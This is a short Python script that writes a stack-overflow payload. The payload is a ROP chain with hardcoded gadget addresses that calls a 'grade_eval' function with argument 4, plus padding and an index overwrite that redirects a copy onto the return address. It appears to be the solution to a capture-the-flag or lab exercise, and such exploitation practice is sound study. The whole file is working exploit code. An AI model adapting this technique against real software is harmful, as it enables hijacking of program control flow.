import sys

chain  = (0x40165a).to_bytes(8, "little")   # ret (stack alignment)
chain += (0x4018a3).to_bytes(8, "little")   # pop rdi; ret (mid-instruction in __libc_csu_init)
chain += (0x4).to_bytes(8, "little")        # edi = 4
chain += (0x401677).to_bytes(8, "little")   # grade_eval

buf = chain + b"A" * (120 - len(chain))     # 120-byte copy source
buf = buf + b"A" * (256 - 120)              # pad to index location (rbp-0x20)
buf = buf + (0xa8).to_bytes(4, "little")    # index = 0xa8 -> copy dest = rbp+8
payload = buf + b"\n"
sys.stdout.buffer.write(payload)
